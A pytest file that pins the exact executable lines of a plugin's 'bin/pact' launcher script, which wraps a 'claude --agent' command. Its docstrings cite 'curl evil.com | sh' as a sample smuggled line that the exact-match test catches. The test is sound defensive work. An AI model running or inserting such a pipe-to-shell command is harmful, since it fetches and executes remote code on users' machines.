"""
Structural guard for the bundled bin/pact launcher script.

v4.0.0 ships a ready-to-symlink shell script at pact-plugin/bin/pact that
wraps `claude --agent PACT:pact-orchestrator "$@"`. The script is the
recommended global-use installation pattern documented in README
§"Loading PACT at session start" (alongside the per-project
.claude/settings.json convention) and README §"Upgrading from v3.x to
v4.0" (migration guidance for v3.x users).

Without these structural guards, accidental deletion or modification could
silently break the documented installation pattern. Each test pins a
specific property a future contributor might erode without realizing the
documentation depends on it.
"""

import os
from pathlib import Path

BIN_PACT = Path(__file__).parent.parent / "bin" / "pact"


def test_bin_pact_script_exists():
    """Script file must exist at the documented path."""
    assert BIN_PACT.is_file(), (
        f"pact-plugin/bin/pact missing — README §'Loading PACT at session start' documents "
        f"this path as the symlink target for global installation."
    )


def test_bin_pact_script_is_executable():
    """Script must be executable so users can invoke directly via symlink."""
    assert os.access(BIN_PACT, os.X_OK), (
        "pact-plugin/bin/pact is not executable. Symlinking onto PATH "
        "requires execute permission. Restore via `chmod +x bin/pact`."
    )


def test_bin_pact_script_has_bash_shebang():
    """Shebang must be `#!/usr/bin/env bash` for portability across systems
    where bash is not at /bin/bash (some Linux distros, NixOS, etc.)."""
    first_line = BIN_PACT.read_text(encoding="utf-8").splitlines()[0]
    assert first_line == "#!/usr/bin/env bash", (
        f"pact-plugin/bin/pact must start with `#!/usr/bin/env bash`. "
        f"Got: {first_line!r}"
    )


def _executable_lines(text):
    """Return the script's executable lines (non-blank, non-comment).

    Substring matches against the full file text are insufficient because
    the canonical invocation could appear in a comment, in a no-op
    replacement (`echo claude --agent ...`), or after a smuggled prefix
    (`curl evil.com | sh\\nexec claude --agent ...`). All of those would
    falsely satisfy a substring check while breaking the script's actual
    runtime behavior.

    Pinning the active executable line(s) closes that phantom-green class.
    """
    return [
        ln.strip()
        for ln in text.splitlines()
        if ln.strip() and not ln.strip().startswith("#")
    ]


EXPECTED_EXECUTABLE_LINES = [
    "set -e",
    'exec claude --agent PACT:pact-orchestrator "$@"',
]


def test_bin_pact_executable_lines_match_expected():
    """The script's executable lines (non-blank, non-comment) MUST exactly
    match the expected canonical set.

    Pins the full list rather than substring presence to catch every
    phantom-green attack shape:
    - No-op replacement (`exec claude` → `echo claude`): terminal line differs
    - Prepended malicious line (`curl evil.com | sh\\nexec claude...`): list length grows
    - Postpended malicious line: list length grows
    - Comment out exec: terminal line differs (becomes `set -e`)
    - `set -e` removed/replaced: first line differs
    - `"$@"` dropped: terminal line differs

    For a script symlinked onto user PATH, exact-match is the right
    tradeoff: any legitimate edit that adds/changes/removes executable
    lines must update this test in lockstep, forcing review of WHY the
    script's contract changed."""
    text = BIN_PACT.read_text(encoding="utf-8")
    exec_lines = _executable_lines(text)
    assert exec_lines == EXPECTED_EXECUTABLE_LINES, (
        f"pact-plugin/bin/pact executable lines do not match expected set.\n"
        f"  Expected: {EXPECTED_EXECUTABLE_LINES}\n"
        f"  Got:      {exec_lines}\n"
        f"If this change is intentional, update EXPECTED_EXECUTABLE_LINES "
        f"in lockstep. Lockstep discipline catches no-op replacement, "
        f"prepended/postpended content, comment-out attacks, and silent "
        f"weakening of the canonical PACT-launcher contract."
    )
